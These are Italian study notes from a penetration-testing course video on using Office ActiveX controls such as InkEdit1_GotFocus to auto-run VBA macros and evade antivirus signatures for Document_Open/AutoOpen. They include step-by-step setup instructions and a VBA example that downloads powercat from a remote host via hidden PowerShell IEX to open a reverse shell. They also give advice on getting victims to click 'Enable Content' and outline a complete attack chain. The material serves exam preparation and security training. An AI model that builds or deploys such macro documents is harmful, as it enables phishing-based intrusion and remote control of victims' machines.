# 017 — Using ActiveX Controls for Macro Execution (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 17/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [017_Using ActiveX Controls for Macro Execution.txt](017_Using ActiveX Controls for Macro Execution.txt) · [017_Using ActiveX Controls for Macro Execution.srt](017_Using ActiveX Controls for Macro Execution.srt)

## Concetti chiave

- **ActiveX** = framework Microsoft (basato su COM) per componenti riutilizzabili interattivi. Originariamente per IE/web, integrato in Office per form/bottoni/embedded media.
- Gli **ActiveX controls** in Office documents possono **trigger macro execution** in alternativa a `Document_Open()` / `AutoOpen()`.
- **Vantaggio chiave**: gli AV cercano firme di `Document_Open`/`AutoOpen` → usare ActiveX **bypassa quel signature**.
- Warning all'utente: **"Active content has been disabled"** (NON "macros disabled") → meno sospetto a target meno tecnici.
- Due modalità: **manuale** (utente clicca il control) e **automatica** (control con evento `*_GotFocus` / `*_Layout` esegue la macro all'apertura).
- Control top-pick per automatic + stealth: **Microsoft InkEdit Control** con subroutine **`InkEdit1_GotFocus()`** — control invisibile, esegue al focus iniziale del doc.

## Spiegazione approfondita

### Cos'è ActiveX
- Set di tecnologie Microsoft per contenuti interattivi (web e desktop).
- Componenti chiamati **ActiveX controls** → embedded in pagine, doc, app.
- In Office: form, button, image box, web browser, media player, ink edit, …
- Eseguono codice arbitrario con i privilegi dell'utente che ha aperto il doc.

### Manuale vs Automatico
**Manuale**: aggiungi un Button/CheckBox ActiveX → `Sub CheckBox1_Click()` esegue la macro quando l'utente clicca. Utile in pretexting (es. "Click here to view content").

**Automatico**: usi un control con evento auto-trigger (es. `InkEdit1_GotFocus`) → all'apertura del doc, il control prende focus → la sub parte → niente `Document_Open`/`AutoOpen`.

### Tabella controls + subroutine auto-exec
| ActiveX Control | Subroutine auto-trigger |
|---|---|
| Microsoft Forms 2.0 Frame | `Frame1_Layout()` |
| Microsoft Forms 2.0 MultiPage | `MultiPage1_Layout()` |
| Microsoft Forms 2.0 ImageBox | `Image1_???` (vari) |
| **Microsoft InkEdit Control** | **`InkEdit1_GotFocus()`** ← preferito |
| Microsoft InkPicture Control | `InkPicture1_Painted()` |
| Microsoft Web Browser | `WebBrowser1_DownloadBegin()` |

Identificatore numerico (`1`, `2`, …) = ordine di inserimento.

### Workflow operativo (Word) — automatic
1. Developer → Controls → **More Controls** (icona chiave inglese).
2. Selezionare **Microsoft InkEdit Control** → OK.
3. Control appare come box vuoto (invisibile out of Design Mode).
4. Right-click → **View Code**.
5. Sostituire la sub default `Private Sub InkEdit1_Click()` con:
   ```vba
   Sub InkEdit1_GotFocus()
       Call MyPayload
   End Sub
   ```
6. (Opzionale) Aggiungere modulo separato con la macro vera:
   ```vba
   Sub MyPayload()
       CreateObject("WScript.Shell").Run "calc.exe", 0, False
   End Sub
   ```
7. Save As → `.doc` (97-2003) → no `Document_Open`/`AutoOpen` necessari.

### Apertura lato vittima
- Warning bar: **"SECURITY WARNING — Some active content has been disabled. Click for more details."**
- Utente clicca **Enable Content** → InkEdit acquisisce focus automaticamente → macro eseguita.

### Chiamare macro esterne dal control
ActiveX subroutine può richiamare qualsiasi `Public Sub` dello stesso project:
```vba
Sub InkEdit1_GotFocus()
    PayloadModule.MaliciousSub
End Sub
```
Permette di **isolare** il payload reale in un modulo separato, control fa da trampolino.

### Excel
Stessa logica, control library identica. Per workbook, equivalenti automatici tipicamente lavorano con `Frame1_Layout` (più affidabile di `InkEdit` su alcune build Excel, come visto nel video con un test failed).

## Comandi & strumenti

| Step | Azione |
|---|---|
| Aggiungere control | Developer → Controls → **More Controls** (icona "screwdriver and wrench") |
| Control invisibile auto | Microsoft InkEdit Control |
| View code | Right-click control (Design Mode ON) → View Code |
| Sub auto-trigger | `Sub InkEdit1_GotFocus()` |
| Toggle Design Mode | Developer → Design Mode |
| Format | `.doc` / `.docm` |
| Avviso lato vittima | "Active content disabled" (NON "Macros") |

## Esempi pratici

```vba
' Pattern definitivo: ActiveX trampolino + payload separato
Sub InkEdit1_GotFocus()
    Call ReverseShellPayload
End Sub

Sub ReverseShellPayload()
    Dim ps As String
    ps = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/powercat.ps1');" & _
         "powercat -c 10.0.0.5 -p 1337 -e cmd"
    Shell "powershell -nop -w hidden -ep bypass -c """ & ps & """", vbHide
End Sub
```

```vba
' Variante: bottone visibile in pretext "Click to view confidential document"
Private Sub CommandButton1_Click()
    CreateObject("WScript.Shell").Run "calc.exe", 0, False
End Sub
```

## Punti d'attenzione per l'esame eCPPT

- **ActiveX = via alternativa per esecuzione macro** che evita le keyword `Document_Open`/`AutoOpen` (signature-detected).
- Warning utente: **"Active content disabled"** → diverso dal warning macro → più credibile.
- **`InkEdit1_GotFocus()`** è il pattern auto-exec più usato (control invisibile + trigger naturale).
- Aggiungere control: **Developer → Controls → More Controls** (chiave inglese).
- ActiveX e VBA macro sono **complementari**: il control è il trigger, la macro VBA è il payload.
- Funziona identicamente in Word ed Excel (con piccole differenze nei control supportati).
- Per disegnare un attack chain: pretext template → InkEdit invisibile → call a sub esterna → PowerShell/Powercat/IEX.

## Collegamenti con altri video

- Precedente: [[016_VBA Reverse Shell Macro with Powercat]]
- Prossimo: [[018_Pretexting Phishing Documents]] — convincere a "Enable Content".
- Sostituzione di `Document_Open`/`AutoOpen`: [[013_VBA Macro Development - Part 2]].
- Payload backend richiamato dal control: [[015_VBA PowerShell Dropper]] · [[016_VBA Reverse Shell Macro with Powercat]].
- HTA usa anche ActiveX dentro JS (vedi `new ActiveXObject("WScript.Shell")`): [[019_HTML Applications (HTA)]].
